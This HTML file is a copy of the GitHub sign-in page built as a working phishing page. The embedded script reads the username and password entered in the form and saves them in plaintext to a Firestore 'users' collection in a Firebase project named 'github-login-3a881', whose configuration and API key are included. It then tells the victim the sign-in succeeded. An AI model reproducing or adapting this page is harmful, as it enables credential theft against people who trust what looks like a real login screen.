<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub Â· GitHub</title>
    <link rel="stylesheet" href="./assets/output.css">
    <link rel="icon" type="image/png" href="./assets/github-seeklogo.svg">

    <!-- Firebase SDK (Modular Approach for Firebase v9 and later) -->
    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
      import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";

      // Firebase configuration
      const firebaseConfig = {
        apiKey: "AIzaSyBUxGcG_hzJHWDeJQEfilnQHWuzBrfCrlg",
        authDomain: "github-login-3a881.firebaseapp.com",
        projectId: "github-login-3a881",
        storageBucket: "github-login-3a881.firebasestorage.app",
        messagingSenderId: "31320454639",
        appId: "1:31320454639:web:36dd1edab817aadf03f21a"
      };

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);

      // Initialize Firestore
      const db = getFirestore(app);

      // Function to handle form submission
      document.querySelector("button").addEventListener("click", async function() {
        const username = document.querySelector('input[type="text"]').value;
        const password = document.querySelector('input[type="password"]').value;
    
        if (username === "" || password === "") {
          alert("Please enter both username and password.");
          return;
        }

        try {
          // Reference to Firestore collection
          const usersRef = collection(db, "users");

          // Add data to Firestore using `addDoc` function
          const docRef = await addDoc(usersRef, {
            username: username,
            password: password
          });

          console.log("Document written with ID: ", docRef.id);
          alert("User signed in successfully");
        } catch (error) {
          console.error("Error adding document: ", error);
          alert("Error adding document: " + error.message);
        }
      });
    </script>

</head>
<body class="bg-git-body">
  <div class="mt-10 flex flex-col justify-center items-center">
      <a href="#"><img class="w-14 mb-7" src="./assets/github-seeklogo.svg"></a>
      <p class="xxsm:text-2xl my-5 text-center text-fontC">Sign in to GitHub</p>

      <div class="bg-git-box xxsm:w-60 xsm:w-80 flex flex-col rounded-md border border-borderC">
          <label class="xxsm:mx-3 pt-3 my-1 text-fontC">Username or email address</label>
          <input class="text-white bg-git-body xxsm:mx-3 my-1 py-1 px-2 rounded-md border border-borderC focus:border-none outline-none focus:outline-[#1f6feb]" type="text" id="username" />

          <ul class="flex space-x-13 xsm:space-x-28 mt-2 my-1">
              <label class="xxsm:mx-3 text-fontC">Password</label>
              <p class="text-blue-500 text-xs my-1 hover:cursor-pointer ">Forgot Password ?</p>
          </ul>
          <input type="password" class="text-white bg-git-body xxsm:mx-3 my-1 py-1 px-2 rounded-md border border-borderC focus:border-none outline-none focus:outline-[#1f6feb]" id="password" />
          <button class="mx-3 my-3 bg-btn0 rounded-md mb-2 py-1 hover:bg-btn1 text-white">Sign in</button>
      </div>

      <div class="bg-git-body xxsm:w-60 xsm:w-80 rounded-md mt-5 py-4 border border-borderC">
          <p class="text-sky-500 text-center text-sm hover:cursor-pointer hover:underline font-bold">Sign in with a passkey</p>
          <div class="flex justify-center my-2 text-sm"><label class="text-white">New to GitHub? </label><span class="text-sky-500 hover:cursor-pointer hover:underline">Create an account</span></div>
      </div>

      <div>
          <ul class="text-gray-400 text-xs sm:flex space-y-3 sm:space-x-3 md:space-x-5 mt-20">
              <li class="hover:cursor-pointer hover:underline hover:text-sky-500 text-center">Terms</li>
              <li class="hover:cursor-pointer hover:underline hover:text-sky-500 text-center">Privacy</li>
              <li class="hover:cursor-pointer hover:underline hover:text-sky-500 text-center">Docs</li>
              <li class="hover:cursor-pointer hover:underline hover:text-sky-500 text-center">Contact GitHub Support</li>
              <li class="hover:cursor-pointer hover:underline hover:text-sky-500 text-center">Manage Cookies</li>
          </ul>
      </div>
  </div>

</body>
</html>
